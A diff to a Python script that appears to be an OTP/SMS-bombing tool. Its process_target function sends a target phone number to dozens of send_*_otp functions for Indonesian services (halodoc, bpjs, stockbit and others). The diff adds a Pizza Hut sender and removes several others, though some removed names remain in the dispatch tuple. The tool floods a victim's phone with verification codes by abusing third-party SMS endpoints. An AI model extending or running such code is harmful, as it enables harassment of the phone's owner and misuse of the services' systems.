@@ -392,8 +392,15 @@ def process_target(api, target62, ip, idx, total):
             log_target(idx, total, name, status_text, detail)
             return success
 
+        elif post_type == 'pizzahut':
+                    number = api['number_fmt'](target62)
+                    resp = send_pizzahut_otp(number)
+                    if resp and resp.status_code in [200, 201]:
+                        status_text, detail, success = "SUCCESS", "OTP sent", True
+                    log_target(idx, total, name, status_text, detail)
+                    return success
         
-        elif post_type in ('bmsecure_aci','segari2','akseleran',
+        elif post_type in ('bmsecure_aci','akseleran',
                            'irmastore','tiptip','tokoplas','toplusms','vidio','kpoin',
                            'nusasms','berprestasi','bisatopup','stockbit','misteraladin',
                            'redbus','buccheri','gabino','moladin','adiraku','tri',
@@ -403,7 +410,6 @@ def process_target(api, target62, ip, idx, total):
             _fn_map = {
                 'bmsecure_aci':  send_bmsecure_aci_otp,
                 'akseleran':     send_akseleran_otp,
-                'irmastore':     send_irmastore_otp,
                 'tiptip':        send_tiptip_otp,
                 'tokoplas':      send_tokoplas_otp,
                 'toplusms':      send_toplusms_otp,
@@ -413,7 +419,6 @@ def process_target(api, target62, ip, idx, total):
                 'berprestasi':   send_berprestasi_otp,
                 'bisatopup':     send_bisatopup_otp,
                 'stockbit':      send_stockbit_otp,
-                'misteraladin':  send_misteraladin_otp,
                 'redbus':        send_redbus_otp,
                 'buccheri':      send_buccheri_otp,
                 'gabino':        send_gabino_otp,
@@ -425,8 +430,6 @@ def process_target(api, target62, ip, idx, total):
                 'alomedika':     send_alomedika_otp,
                 'bpjs':          send_bpjs_otp,
                 'halodoc':       send_halodoc_otp,
-                'pinhome':       send_pinhome_otp,
-                'rumah123':      send_rumah123_otp,
                 'easycash':      send_easycash_otp,
                 'kreditpintar':  send_kreditpintar_otp,
                 'skillacademy':  send_skillacademy_otp,
